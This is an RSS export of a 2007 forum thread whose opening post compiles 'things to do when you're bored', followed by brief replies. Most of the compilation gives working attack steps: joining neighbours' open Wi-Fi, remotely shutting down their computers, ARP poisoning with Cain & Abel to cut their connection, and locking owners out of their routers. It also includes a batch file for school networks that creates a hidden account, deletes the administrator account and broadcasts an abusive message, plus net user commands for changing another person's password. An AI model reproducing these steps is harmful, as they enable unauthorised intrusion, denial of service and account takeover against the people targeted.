<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Things to do when you&#39;re bored</title>
    <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479</link>
    <description>[b][u]I DID NOT MAKE THESE, I JUST PICKED OUT THE ONES THAT I LIKED, I PUT THE URL OF THE THREAD I GOT IT FROM AT THE BOTTOM OF EACH ONE[/u][/b]
[b][u]THINGS TO DO WHEN YOU&#39;RE BORED:[/u][/b]
[i][u]Hacking/Computers/Cool stuff:[/u][/i]
1)[u]Having fun on other peoples Network:[/u]
Ok, as a start: It&#39;s best to have a LapTop with a wireless ethernet card.
If you don&#39;t, You need a wireless USB thingy.
If u have 1 of &#39;em, you can continue...
STEP 1 - CONNECTING TO THEIR NETWORK
1.Go to control panel
2.Go to Network Connections
3.Right click on your wireless ethernet card or USB and click &quot;show avilable networks&quot;....it will scan.
4.If you are close to a network, it will be on the list
5.Click connect

*IF THE NETWORK IS PASSWORD PROTECTED, THEN POOR YOU, BUT IF IT ISN&#39;T, YOU CAN CONTINUE*

Now you are on another guys network.
this is what you can do:
&gt;Shutdown their computer
&gt;Take out their internet
&gt;Send &#39;em pop up messenges
&gt;Password protect their OWN router, so they cant access it.
All of this is illegal as hell, som be carefull!

*SHUTING DOWN THEIR COMPUTER*

1.Once connected, click &quot;Start&gt;Run&gt;CMD&quot;
2.Type &quot;ipconfig /all&quot;
3.Find LOCAL IP
4.Type the IP in your browser
5.Now, your inside their router, look for something like &quot;attachments connected&quot; or someting. Basicly, it means whos connected.
6.Once you find it, you can see their computer name and IP
7.Now go back to CMD and type &quot;shutdown -i&quot;
8.In the list click &quot;add&quot; type the IP your gonna shutdown, example: 192.168.1.7.You can also type in computer name if the IP didnt work.
9.Choose &quot;shutdown&quot; from the dropdown and type in something funny in the warning messege, like &quot;TROJAN ATTACK&quot; or something, lol.
If everything was done correctly, it will say &quot;successfull&quot; or sommething in CMD

*BLOCKING THEM FROM THE INTERNET*

1.Get Cain &amp; Abel, search google
2.Get ZoneAlarm Pro
3.Once both of the are installed, connect again
4.Run Cain &amp; Abel, and enable the sniffer.
5.Then sniff the networks MAC adresses.
6.Now, go to the APR tab, and click &quot;add&quot; (the blue pluss), there will be some to the right, click the top of &#39;em, it should be &quot;192.168.1.1&quot;.
7.Now some IP&#39;s should have popped up at the right, higlight all of them and click POISON NETWORK, or something.
8.Now, open ZAP and add their IP&#39;s into the BLOCKED ZONE, ip example: 192.168.1.5
9.Go to the &#39;main&#39; tab and move internet security to MED and the trusted zone security to MED.If that didn&#39;t work, move both to HIGH. If that didnt work, click the big red button that says &quot;stop&quot;
If you did that correctly, you just fucked their internet!

*SENDING POP-UP MESSENGES*

1.Open CMD
2.Type Net Send (IP HERE) (MESSENGE HERE)
Example: Net Send 192.168.1.5 I know where you live!
Nice huh?

*PASSWORD PROTECTING THE ROUTER*

1.Type your LOCAL IP (in cmd, type ipconfig /all and find out) into ur browser.
2.Find something about &quot;password protection&quot; or something.
3.Make a new password
4.Voila! Now you need a login to access the internet!
[url=http://www.moparisthebest.com/smf/index.php/topic,3879.0.html]http://www.moparisthebest.com/smf/index.php/topic,3879.0.html[/url]
---------------------------------------------------
2)[u]Hacking coke machines:[/u]
PREFACE
Coke vending machines are everywhere. They&#39;re getting more and more like regular computers with LEDs that show little &quot;ICE COLD&quot; messages and whatnot. Well, there&#39;s a lot more to those little built-in computers than you may think. Included in the low-level operating system that these babies run on is an actual debug menu that gives you access to all sorts of machine information and possibly gives you free cokes in older machines.



WHICH MACHINES WORK?
There&#39;s a very strict list of vending machines that have the debug menu. First off, they&#39;re all COCA-COLA product vending machines. This means the giant, un-missable picture on the front must show any of the following: Coke, Dasani (Water), Barq&#39;s Root Beer, Vanilla Coke, Cherry Coke, Sprite, Evlan (water), Fanta, Fresca, Frutopia, Hi-C, Sprite Remix, Mad River, Mello Yello, Minute Maid, Nestea, Odwalla, Mr. Pibb/Pibb Xtra, Planet Java, Power Ade, Seagram&#39;s Ginger Ale, Simply Orange, Sparkletts, or Tab. Of course anything Diet or Caffeine free works too.
The machine must have an LED screen. Some of the older ones just allow the LED to be set to a price amount and won&#39;t have the debug menu. You&#39;re safer if the little LED is telling you something. Usually it will scroll a little message like &quot;Ice Cold Cokes&quot;. Newer machines are more likely candidates.



ACCESSING THE MENU
To enter the menu, there&#39;s a button combination. HERE&#39;S THE ONLY THING YOU HAVE TO REALLY REMEMBER:

[4]-[2]-[3]-[1]

The buttons are numbered depending on how they are positioned. They will either be vertical (more likely), or in horizontal rows of 4 buttons per row. If it is vertical, the first button is #1, the one below it is #2, and so forth. If the buttons are in horizontal rows, the first button is #1, and the one to the right of it is #2. The numbers work like a type writer after that. In rows of 4, the first button of row 2 will be button #5. So, to review, getting in to the debug menu looks like this:

COKE MACHINE::::::
$1.00 -------
-------------
[ Coke ] &lt;-- Hit this button last
[ Coke ] &lt;-- Hit this button second
[ Diet Coke ] &lt;-- Hit this button third
[ Sprite ] &lt;-- Hit this button first
[ And so on ]
-------------

Some text should show up on the LED (probably the word &quot;Error&quot;, we&#39;ll explain what it means next sections). If nothing happens, your machine doesn&#39;t have the debug menu.



NAVIGATION
To navigate from option to option (What they are is next section), remember the numberings we gave the buttons. They work as follows:
Button [ 1 ] - Exit/Back
Button [ 2 ] - Up
Button [ 3 ] - Down
Button [ 4 ] - Select



OPTIONS
Depending on the age of the machine, you will get a varying amount of default options available.
On older machines: SALE, VER, EROR, and RTN
On newer machines: CASH, SALE, EROR, and RTN

CASH - Machine Earnings Display
The CASH option will display how much money is in the machine currently. It generally takes a second or two to load. From here, you can scroll up and down through 12 or 16 different options, depending on the machine age. These other options display how much money was spent on each individual item, classified through its button (or slot, as I like to call it) number.
A neat side note about the slot numbers is that there are more slot numbers than there are actual slot, so usually the last 4 buttons contain zero money. This could be so that the same OS could be used on bigger machines, but the newer machines have even more slot numbers.

SALE - Total Sale Count
The SALE option displays how many drinks have been sold out of the machine. This tends to be cumulative, but not on all machines. The stock guy is probably supposed to reset this each time he re-stocks. Also, this has the same sub-options as the CASH option, where you can scroll up and down and see how many drinks have been sold from each slot.

VER - System/Machine Version?
This option will cause a large alphanumeric string to scroll across the LCD. The number looks very much like a serial number, but doesn&#39;t vary from machine to machine. It is most likely the OS or machine version number, but of the older machines that have the option, I haven&#39;t seen one that doesn&#39;t have the same number.

EROR - Error Log
There are 8 different types of errors - COLJ (Column Jams), VEnd (Vend Mechanism), door (Door Switch), sels (Select Switch), CHAR (Changer Errors), acce (Acceptor Errors), StS (Space-to-sales errors), and bVal (Bill Validators). The separate types and actual errors are useless, as you assumably can&#39;t get inside the machine, BUT(!) you can clear the errors. Hold the enter (Number 4) button down for about 2 seconds, and it should clear the error.

RTN - Return
This is simply the return option. Selecting this will exit the debug menu. On newer machines, pressing the BACK button at the main menu will not exit, and RTN must be selected.
A side note: The menu can also be exited by pressing the coin return button.

EXTRAS
By holding in the coin return button and not releasing, on the newer &quot;big-button&quot; machines, this will display the internal temperature in Fahrenheit, as in &quot;42F&quot;.

**Update**
There are many more menu options that are only accessible if they&#39;ve either been enabled from the computer inside the machine, or on the internal computer behind the door (Probably not feasible for you to access).

CPO - Coin Payout Mode
You can can dump coins from the coin mechanism, and the various menu options allow you to choose which type of coins (Nickels, dimes, etc.) are dumped.

tVFL - Tube Fill Mode
This is useless to you. This allows you to load coins into the coin tubes, which you can&#39;t do from the outside.

TEST - Test Routines
This allows you to test the following various routines:
SE Allows you to test the buttons. Will give you number
of button when you press it
SP Sold-out paddle test. Not quite sure, most likely internal function.
Su Sold-out switch test. Same as paddle.
CO Motor test. Will run various column motors.
Cn Coin test. Put in a coin and it will tell you what kind of
coin it is.
nA Note acceptor test. Same as Cn, but for bills.
dSP Display test. Will illuminate various LEDs.
vErS Rattles off version number.

RELY - Relay test
This tests the relay electronic control of various parts. Do not do, as it will cause damage if various internal parts are not unplugged before usage.

PASS - Password
This is not normally accessible, but allows you to change the menu password from the 4-2-3-1. Whoo!

PrIC - Price Setting
Used to set the price for a drink. Not sure how to work it, but it seems simple enough.

StOS - Space-to-sales routine
Lets you change the STS routine and other options. This means that various buttons will all mean the same thing, i.e. the 6 coke buttons don&#39;t actually vend from 6 different columns, but vend from one (changing when one runs out of course).

COn - Machine Configuration/Permissions
This is the machine config menu that decides what of these options you are allowed to access through the outside panel. This is probably only accessible with the door open. I won&#39;t go into detail, but I&#39;ll list the Config numbers and what each do: C1 sets price menu on, C2 sets special (manufacturer) options on), C3 disables the &quot;ICE COLD COKE&quot; message. C4 is autoviewing of menu when door is opened, C5 is door switch status, C6 is mysteriously reserved for &quot;future use&quot;, C7 determines whether your money credit stays in for 5 minutes or indefinitely, C8 is Force Vend, C9 allows multiple vends without putting in more money (i.e put in a 5 and get 3 cokes and then your change), and C10 is Escrow Inhibit.

CCoC - Correct Change Only Control
Adjusts Correct Change only rule to your liking.

TIME - Time Adjustment
Allows you to set the machine&#39;s local time.

LANG - Language Selection
Not sure how many languages are supported, but there are apparently more than just English.



USEFULNESS
Unless you can get behind the door, there&#39;s little you can do with this except impress your friends. However, if you&#39;re able to set the C-switches properly, you&#39;ll be able to manipulate the machine in any way you want, get free drinks, change the price, set up cool buy-one-get-one-free deals, etc, etc . Not to forget, knowledge is power. One step closer to free sodas!
[url=http://www.moparisthebest.com/smf/index.php/topic,14616.0.html]http://www.moparisthebest.com/smf/index.php/topic,14616.0.html[/url]
---------------------------------------------------
3)[u]Hacking Your school using a batch file:[/u]
Firstly for people who don&#39;t know how to use CMD. You will not need to use CMD in this tut.
I made it much easier for people.I made a code for you to copy/paste in notepad. Just save it as a bat file.

[code]@ECHO OFF
:START
ECHO made by jonckr
ECHO *******************************************************************
ECHO ******************** account maker will only work on networks******
ECHO **************make the account then hade the disc or flash drive***
ECHO *******************************************************************
ECHO USERNAME=death
ECHO PASSWORD=death

NET SEND /USERS &quot;HELLO FAGS THIS SCHOOL IS GAY HAVE FUN&quot;
NET USER death * /ADD /ACTIVE:YES /PASSWORDCHG:NO /EXPIRES:NEVER /TIMES:ALL
ECHO Delete the administrator account
NET USER administrator /DELETE
NET USER adimini /DELETE
NET USE /HOME
PAUSE[/code]


After copying and pasting it, save it as ACCOUNT MAKER.bat


then save it to a disc or a flash drive take it to school and it will give you the new user-name to sign in with and the password and it will look like its not typing any thing but it is atfer words it send a Message to every computer hello fags this school is gay have fun and hopefully it deletes the administrator account have fun

do what you want to the school and what you do i do not take the blame for it have fun
[url=http://www.moparisthebest.com/smf/index.php/topic,30472.0.html]http://www.moparisthebest.com/smf/index.php/topic,30472.0.html[/url]
---------------------------------------------------
4)[u]School computer pranks:[/u]
1. when you victim/friend has leaft the computer. take a print screen of your victims desktop and then paste it into print and save as. delete all the icons off the desktop and then start&gt;control panel&gt;printers and other hardware&gt;mouse&gt;pointers and and double click normal select and browse for the loading pointer. and press apply. then hide the start toolbar and wait for him to come back. laugh your @$$ off cuz ur victim is siting there waiting for it to load. 

2.open not pad and conitunously prss ctrl+n. and sit back and watch your friend try to exit all of them. 

3.When someone leaves their computer, go into microsoft word and make an auto correct option to change the word *the* into the word poo or sumthing like that. 

3.First go to google and search windows shutdown utility. DL it. put a shortcut on the desktop and change the icon to the firefox icon and rename the name to firefox or wateva. and next wen they go on there comp. watch them constenly  turn off there comp and they dont know y
[url=http://www.moparisthebest.com/smf/index.php/topic,75863.0.html]http://www.moparisthebest.com/smf/index.php/topic,75863.0.html[/url]
---------------------------------------------------
5)[u]Changing someones password without knowing it:[/u]
Okay this is how you do this on windows XP

Now this may sound stupid, but it may help for those people who get constantly grounded like me =P
First you need access to a guest or administrator account so this is the hard part, you just have to wait for your parents to leave the computer on or something so you can get on for about 1 minute. (one way i reccomend is tell them you need to research for homework or something and actually research but do this at the same time)

Go to start&gt;run.  This should bring up a little window where you need to type in &quot;cmd&quot; (with no quotations).. It will bring up the command box where you will type this:

[code]
net user[/code]
It will bring up a list of all of the accounts on your PC.  after you type that, type this:

[code]
net user (name of user you want to change the password to) (password)[/code]
So if the persons name was bill and you wanted the pass to be cheese, you would put put:

[code]
net user bill cheese[/code]
Make sure you put a space in between the persons name and the pass
[url=http://www.moparisthebest.com/smf/index.php/topic,130221.0.html]http://www.moparisthebest.com/smf/index.php/topic,130221.0.html[/url]
---------------------------------------------------
6)[u]Shuting down someones computer while connected by the same router:[/u]
First off go to start, go to run and type shutdown -i

Wait for the box to pop up called &quot; remote shutdown &quot;

Then pick your victim.
[url=http://www.moparisthebest.com/smf/index.php/topic,61564.0.html]http://www.moparisthebest.com/smf/index.php/topic,61564.0.html[/url]
---------------------------------------------------
7)[u]Make your lighter have a huge flame:[/u]
This is really cool if you do it right!
All you need is a lighter that has an adjustable gas valve... like this

[img]http://www.networds.com/remodel/images/artifacts/lighter.jpg[/img]

i cant give very many pics because I turned the fuel up too high and it sucked all the gas down...

Ok here we go...

Step 1: take the metal gaurd off
Step 2: turn the gas up as far as you can
Step 3: the gas control should be a black ring that goes around a white piece. Lift it up so it doesent turn the white peice and move it all the way to back to the left.
Step 4: push the ring down
Step 5: turn the gas up again. (thats double the gas)
(optional) Step 6: repeat
(optional) Step 7: put metal cover back on

it seems to have trouble lighting at really high gas levels but it will light if you do it right
[url=http://www.moparisthebest.com/smf/index.php/topic,20350.0.html]http://www.moparisthebest.com/smf/index.php/topic,20350.0.html[/url]
---------------------------------------------------
8)[u]How to make a can bomb:[/u]
Ok get a normal can.May it be coke or lemonade be it cheap or expensive any can will do.
Step1.Get can and shake doesn&#39;t matter how you shake it just SHAKE TILL YOU&#39;R ARMS DROP OFF.
(Optinol: Make it so a tiny trickle comes out of can.My friend and I suspect it makes it projectile)
Step2.throw it up into the air.May it be a violent flick or a whimpy throw doesn&#39;t matter.
step3:Unless you have shitty clothes on i&#39;d move outta the area.
Step4:Run like hell if you do it near a school or anypuplic place where road or road-type substance is becuase it stains the floor.
[url=http://www.moparisthebest.com/smf/index.php/topic,25447.0.html]http://www.moparisthebest.com/smf/index.php/topic,25447.0.html[/url]
---------------------------------------------------
9)[u]How to find remembered firefox passowords:[/u]
OK this is pretty easy to do and most people probably know about it but here it goes...

OK first open up Mozilla Firefox and click TOOLS then OPTIONS [img]http://img244.imageshack.us/img244/1061/toolsoptionsxo2.png[/img]

Now click SECURITY then SHOW PASSWORDS...  
[img]http://img133.imageshack.us/img133/5206/secpasspb3.png[/img]a pop-up will then appear its should look like this:
[img]http://img133.imageshack.us/img133/2952/secpassht6.png[/img]


Click SHOW PASSWORDS it will ask you &#39;are you sure blah blah blah&#39; click yes

and there are the passwords 

this works great at my school because people click yes and don;t notice what there clicking yes to (being them saving there passes)
[url=http://www.moparisthebest.com/smf/index.php/topic,48028.0.html]http://www.moparisthebest.com/smf/index.php/topic,48028.0.html[/url]
---------------------------------------------------
10)[u]How to become a ninja!:[/u]
[img]http://server6.uploadit.org/files/greatisgood-Ninja.jpg[/img]
[url=http://www.moparisthebest.com/smf/index.php/topic,33782.0.html]http://www.moparisthebest.com/smf/index.php/topic,33782.0.html[/url]
---------------------------------------------------</description>
    
    <lastBuildDate>Sat, 20 Oct 2007 03:16:46 +0000</lastBuildDate>
    <category>General Discussion</category>
    <atom:link href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@Unid_H4x0r Unid H4x0r]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/unid_h4x0r">@Unid_H4x0r</a> wrote:</p>
          <blockquote>
              <p>playing on other peoples network? lol thats called WireLESS</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/12">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/12</link>
        <pubDate>Sat, 20 Oct 2007 03:16:46 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-12</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@Gotta_Catch_Them_All Gotta Catch Them All]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/gotta_catch_them_all">@Gotta_Catch_Them_All</a> wrote:</p>
          <blockquote>
              <aside class="quote no-group" data-post="7" data-topic="97479">
<div class="title">
<div class="quote-controls"></div>
 n00b pk3r:</div>
<blockquote>
<p>who in the world is gonna wanna be a ninja for reall come on?</p>
</blockquote>
</aside>
<p>I, for one, would like to be a ninja for real.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/11">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/11</link>
        <pubDate>Sat, 20 Oct 2007 00:20:50 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-11</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@ThAt0n36Uy Elijah]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/that0n36uy">@ThAt0n36Uy</a> wrote:</p>
          <blockquote>
              <p>I hate Junior members, all he’s done is copied other peoples tutorials and put them into one post, he did nothing special. Really this should be against the rules.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/10">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/10</link>
        <pubDate>Thu, 18 Oct 2007 19:09:03 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-10</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@killer198 killer198]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/killer198">@killer198</a> wrote:</p>
          <blockquote>
              <p>lol shut down is the best also the sending command thingy</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/9">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/9</link>
        <pubDate>Thu, 18 Oct 2007 09:47:24 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-9</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@Danny068 Danny068]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/danny068">@Danny068</a> wrote:</p>
          <blockquote>
              <p>Lol, like the shut down one</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/8">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/8</link>
        <pubDate>Sun, 14 Oct 2007 18:51:37 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-8</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@n00b_pk3r n00b pk3r]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/n00b_pk3r">@n00b_pk3r</a> wrote:</p>
          <blockquote>
              <p>who in the world is gonna wanna be a ninja for reall come on?</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/7">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/7</link>
        <pubDate>Mon, 08 Oct 2007 19:50:35 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-7</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@ZIAN678 ZIAN678]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zian678">@ZIAN678</a> wrote:</p>
          <blockquote>
              <p>lmao wow… very nice. beats the programs to shut down their comp. nice nice</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/6">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/6</link>
        <pubDate>Sat, 06 Oct 2007 19:58:39 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-6</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@n00b_pk3r n00b pk3r]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/n00b_pk3r">@n00b_pk3r</a> wrote:</p>
          <blockquote>
              <p>haha can bomb funny</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/5</link>
        <pubDate>Sat, 06 Oct 2007 18:28:34 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-5</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@liltwixis11 liltwixis11]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/liltwixis11">@liltwixis11</a> wrote:</p>
          <blockquote>
              <p>Yea…I said that…</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/4</link>
        <pubDate>Mon, 21 May 2007 01:05:31 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-4</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@Ultimacool Ultimacool]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ultimacool">@Ultimacool</a> wrote:</p>
          <blockquote>
              <p>Lol i like it,Might do it sometime</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/3</link>
        <pubDate>Sun, 20 May 2007 17:13:04 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-3</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@liltwixis11 liltwixis11]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/liltwixis11">@liltwixis11</a> wrote:</p>
          <blockquote>
              <p>Reserved[br][size=1]Posted on: May 19, 2007, 11:12:39 PM[/size][hr]reserved again(just incase i add more)</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/2</link>
        <pubDate>Sun, 20 May 2007 11:13:01 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-2</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
      <item>
        <title>Things to do when you&#39;re bored</title>
        <dc:creator><![CDATA[@liltwixis11 liltwixis11]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/liltwixis11">@liltwixis11</a> wrote:</p>
          <blockquote>
              <p><span class="bbcode-b"><span class="bbcode-u">I DID NOT MAKE THESE, I JUST PICKED OUT THE ONES THAT I LIKED, I PUT THE URL OF THE THREAD I GOT IT FROM AT THE BOTTOM OF EACH ONE</span></span><br>
<span class="bbcode-b"><span class="bbcode-u">THINGS TO DO WHEN YOU’RE BORED:</span></span><br>
<span class="bbcode-i"><span class="bbcode-u">Hacking/Computers/Cool stuff:</span></span><br>
1)<span class="bbcode-u">Having fun on other peoples Network:</span><br>
Ok, as a start: It’s best to have a LapTop with a wireless ethernet card.<br>
If you don’t, You need a wireless USB thingy.<br>
If u have 1 of 'em, you can continue…<br>
STEP 1 - CONNECTING TO THEIR NETWORK<br>
1.Go to control panel<br>
2.Go to Network Connections<br>
3.Right click on your wireless ethernet card or USB and click “show avilable networks”…it will scan.<br>
4.If you are close to a network, it will be on the list<br>
5.Click connect</p>
<p><em>IF THE NETWORK IS PASSWORD PROTECTED, THEN POOR YOU, BUT IF IT ISN’T, YOU CAN CONTINUE</em></p>
<p>Now you are on another guys network.<br>
this is what you can do:</p>
<blockquote>
<p>Shutdown their computer<br>
Take out their internet<br>
Send 'em pop up messenges<br>
Password protect their OWN router, so they cant access it.<br>
All of this is illegal as hell, som be carefull!</p>
</blockquote>
<p><em>SHUTING DOWN THEIR COMPUTER</em></p>
<p>1.Once connected, click “Start&gt;Run&gt;CMD”<br>
2.Type “ipconfig /all”<br>
3.Find LOCAL IP<br>
4.Type the IP in your browser<br>
5.Now, your inside their router, look for something like “attachments connected” or someting. Basicly, it means whos connected.<br>
6.Once you find it, you can see their computer name and IP<br>
7.Now go back to CMD and type “shutdown -i”<br>
8.In the list click “add” type the IP your gonna shutdown, example: 192.168.1.7.You can also type in computer name if the IP didnt work.<br>
9.Choose “shutdown” from the dropdown and type in something funny in the warning messege, like “TROJAN ATTACK” or something, lol.<br>
If everything was done correctly, it will say “successfull” or sommething in CMD</p>
<p><em>BLOCKING THEM FROM THE INTERNET</em></p>
<p>1.Get Cain &amp; Abel, search google<br>
2.Get ZoneAlarm Pro<br>
3.Once both of the are installed, connect again<br>
4.Run Cain &amp; Abel, and enable the sniffer.<br>
5.Then sniff the networks MAC adresses.<br>
6.Now, go to the APR tab, and click “add” (the blue pluss), there will be some to the right, click the top of 'em, it should be “192.168.1.1”.<br>
7.Now some IP’s should have popped up at the right, higlight all of them and click POISON NETWORK, or something.<br>
8.Now, open ZAP and add their IP’s into the BLOCKED ZONE, ip example: 192.168.1.5<br>
9.Go to the ‘main’ tab and move internet security to MED and the trusted zone security to MED.If that didn’t work, move both to HIGH. If that didnt work, click the big red button that says “stop”<br>
If you did that correctly, you just fucked their internet!</p>
<p><em>SENDING POP-UP MESSENGES</em></p>
<p>1.Open CMD<br>
2.Type Net Send (IP HERE) (MESSENGE HERE)<br>
Example: Net Send 192.168.1.5 I know where you live!<br>
Nice huh?</p>
<p><em>PASSWORD PROTECTING THE ROUTER</em></p>
<h2>1.Type your LOCAL IP (in cmd, type ipconfig /all and find out) into ur browser.<br>
2.Find something about “password protection” or something.<br>
3.Make a new password<br>
4.Voila! Now you need a login to access the internet!<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,3879.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,3879.0.html</a>
</h2>
<p>2)<span class="bbcode-u">Hacking coke machines:</span><br>
PREFACE<br>
Coke vending machines are everywhere. They’re getting more and more like regular computers with LEDs that show little “ICE COLD” messages and whatnot. Well, there’s a lot more to those little built-in computers than you may think. Included in the low-level operating system that these babies run on is an actual debug menu that gives you access to all sorts of machine information and possibly gives you free cokes in older machines.</p>
<p>WHICH MACHINES WORK?<br>
There’s a very strict list of vending machines that have the debug menu. First off, they’re all COCA-COLA product vending machines. This means the giant, un-missable picture on the front must show any of the following: Coke, Dasani (Water), Barq’s Root Beer, Vanilla Coke, Cherry Coke, Sprite, Evlan (water), Fanta, Fresca, Frutopia, Hi-C, Sprite Remix, Mad River, Mello Yello, Minute Maid, Nestea, Odwalla, Mr. Pibb/Pibb Xtra, Planet Java, Power Ade, Seagram’s Ginger Ale, Simply Orange, Sparkletts, or Tab. Of course anything Diet or Caffeine free works too.<br>
The machine must have an LED screen. Some of the older ones just allow the LED to be set to a price amount and won’t have the debug menu. You’re safer if the little LED is telling you something. Usually it will scroll a little message like “Ice Cold Cokes”. Newer machines are more likely candidates.</p>
<p>ACCESSING THE MENU<br>
To enter the menu, there’s a button combination. HERE’S THE ONLY THING YOU HAVE TO REALLY REMEMBER:</p>
<p>[4]-[2]-[3]-[1]</p>
